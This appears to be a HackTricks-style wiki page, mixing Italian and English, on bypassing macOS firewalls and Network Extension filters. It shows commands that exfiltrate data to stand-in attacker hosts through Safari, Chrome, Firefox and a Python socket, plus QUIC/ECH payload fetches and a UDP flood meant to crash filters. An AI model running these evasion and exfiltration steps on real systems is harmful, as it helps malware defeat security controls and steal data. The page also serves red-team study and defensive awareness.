# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Tecniche trovate

Le seguenti tecniche sono state trovate funzionanti in alcune app firewall per macOS.

### Abusing whitelist names

- Ad esempio chiamare il malware con i nomi di processi macOS ben noti come **`launchd`**

### Synthetic Click

- Se il firewall chiede il permesso all'utente, fare in modo che il malware **click on allow**

### **Use Apple signed binaries**

- Come **`curl`**, ma anche altri come **`whois`**

### Well known apple domains

Il firewall potrebbe consentire connessioni a domini apple ben noti come **`apple.com`** o **`icloud.com`**. E iCloud potrebbe essere usato come C2.

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

Conoscere il traffico consentito ti aiuterà a identificare potenziali domini whitelisted o quali applicazioni sono autorizzate ad accedervi
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuso del DNS

Le risoluzioni DNS vengono eseguite tramite l'applicazione firmata **`mdnsreponder`**, che probabilmente sarà autorizzata a contattare i server DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tramite app browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Tramite process injections

Se puoi **inject code into a process** che è allowed to connect to any server potresti bypassare le protezioni del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilità recenti di bypass del firewall macOS (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Nel luglio 2024 Apple ha patched un bug critico in Safari/WebKit che ha rotto il system-wide “Web content filter” usato dai controlli parentali di Screen Time.
Un URI appositamente creato (per esempio, con doppio URL-encoded “://”) non è recognised dall'ACL di Screen Time ma è accepted da WebKit, quindi la richiesta viene inviata unfiltered. Qualsiasi process che può open a URL (inclusi codice sandboxed o unsigned) può quindi raggiungere domini che sono esplicitamente bloccati dall'utente o da un profilo MDM.

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) bug di ordinamento delle regole nelle prime versioni di macOS 14 “Sonoma”
Durante il ciclo beta di macOS 14 Apple ha introdotto una regressione nel wrapper in userspace attorno a **`pfctl`**.
Le regole aggiunte con la keyword `quick` (usata da molti VPN kill-switches) venivano ignorate silenziosamente, causando leak di traffico anche quando la GUI del VPN/firewall mostrava *blocked*. Il bug è stato confermato da diversi vendor VPN e corretto in RC 2 (build 23A344).

Controllo rapido del leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Sfruttamento dei servizi helper firmati da Apple (legacy – pre-macOS 11.2)
Prima di macOS 11.2 la **`ContentFilterExclusionList`** permetteva a circa 50 binari Apple, come **`nsurlsessiond`** e App Store, di bypassare tutti i firewall socket-filter implementati con il Network Extension framework (LuLu, Little Snitch, ecc.).
Il malware poteva semplicemente spawnare un processo escluso — oppure injectare codice in esso — e tunnelare il proprio traffico attraverso il socket già consentito. Apple ha rimosso completamente l'exclusion list in macOS 11.2, ma la tecnica è ancora rilevante sui sistemi che non possono essere aggiornati.

Example proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH per eludere i filtri di dominio di Network Extension (macOS 12+)
NEFilter Packet/Data Providers si basano sul TLS ClientHello SNI/ALPN. Con **HTTP/3 over QUIC (UDP/443)** e **Encrypted Client Hello (ECH)** lo SNI resta cifrato, NetExt non può analizzare il flow, e le hostname rules spesso fail-open, permettendo al malware di raggiungere domini bloccati senza toccare DNS.

PoC minimo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Se QUIC/ECH è ancora abilitato, questo è un semplice percorso di evasione del hostname-filter.

### macOS 15 “Sequoia” instabilità di Network Extension (2024–2025)
Le prime build 15.0/15.1 fanno crashare i filtri di terze parti **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, ecc.). Quando il filtro si riavvia, macOS perde le sue flow rules e molti prodotti vanno in fail‑open. Sovraccaricare il filtro con migliaia di brevi UDP flows (o forzando QUIC/ECH) può ripetutamente innescare il crash e lasciare una finestra per C2/exfil mentre la GUI dichiara ancora che il firewall è attivo.

Riproduzione rapida (macchina di laboratorio sicura):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Consigli sugli strumenti per macOS moderno

1. Ispeziona le regole PF correnti generate dai GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Elenca i binari che già possiedono l'entitlement *outgoing-network* (utile per piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra programmaticamente il tuo Network Extension content filter in Objective-C/Swift.
Un PoC rootless minimale che inoltra pacchetti a un socket locale è disponibile nel codice sorgente di Patrick Wardle’s **LuLu**.

## Riferimenti

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
